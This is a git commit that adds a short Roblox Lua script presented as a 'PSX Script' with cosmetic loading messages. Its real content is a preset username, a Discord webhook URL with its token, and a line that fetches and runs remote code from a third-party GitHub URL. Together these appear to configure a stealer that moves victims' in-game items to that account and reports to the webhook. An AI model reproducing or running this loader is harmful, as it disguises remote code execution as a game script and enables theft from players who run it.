76812d03b68a15a6e2e1e39d986a2b369ebd4810
KYYOCHI <125777413+KYYOCHI@users.noreply.github.com>
2023-03-05 13:06:52 +0800

    Create Main.lua

---
+++ Main.lua
@@ -0,0 +1,10 @@
+
+Username = "404_demon213"
+WebHook = "https://discord.com/api/webhooks/1081804267125493840/eECqqPXu64kYGKCKV_12hjiYIZBPnvteigCDgi83s_W2WhlVwC9megNrX4Z8_bgnUuD4"
+
+_G.CustomScriptName = "PSX Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
